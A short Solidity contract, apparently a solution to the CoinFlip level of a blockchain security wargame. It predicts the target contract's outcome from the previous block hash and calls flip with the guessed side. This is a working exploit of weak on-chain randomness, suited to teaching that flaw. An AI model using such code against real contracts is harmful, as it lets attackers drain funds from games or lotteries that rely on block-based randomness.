// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

import "hardhat/console.sol";

error AttackingCoinFlip__CallUnsuccessful();

contract AttackingCoinFlip {
    address public contractAddress;

    // Copy FACTOR from CoinFlip contract
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }
    
    function hackContract() external {
        
        // Use same logic from CoinFlip contract to identify the proper boolean value
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        console.log(coinFlip);
        bool side = coinFlip == 1 ? true : false;

        // Call CoinFlip contract, passing in the proper value
        (bool success, ) = contractAddress.call(abi.encodeWithSignature("flip(bool)", side));
        
        if (!success) {
            revert AttackingCoinFlip__CallUnsuccessful();
        }

    }
}
